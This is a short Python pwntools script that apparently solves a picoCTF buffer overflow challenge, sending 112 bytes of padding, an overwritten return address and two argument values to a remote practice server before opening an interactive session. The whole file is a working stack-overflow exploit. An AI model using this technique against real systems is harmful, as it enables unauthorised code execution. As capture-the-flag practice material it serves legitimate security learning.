from pwn import *

io = remote("saturn.picoctf.net",55226)

payload = b'A'*112 + p32(0x08049296) + b'C'*4 +  p32(0xCAFEF00D) + p32(0xF00DF00D)


io.sendlineafter(":",payload)
# gdb.attach(io)
#
#
io.interactive()
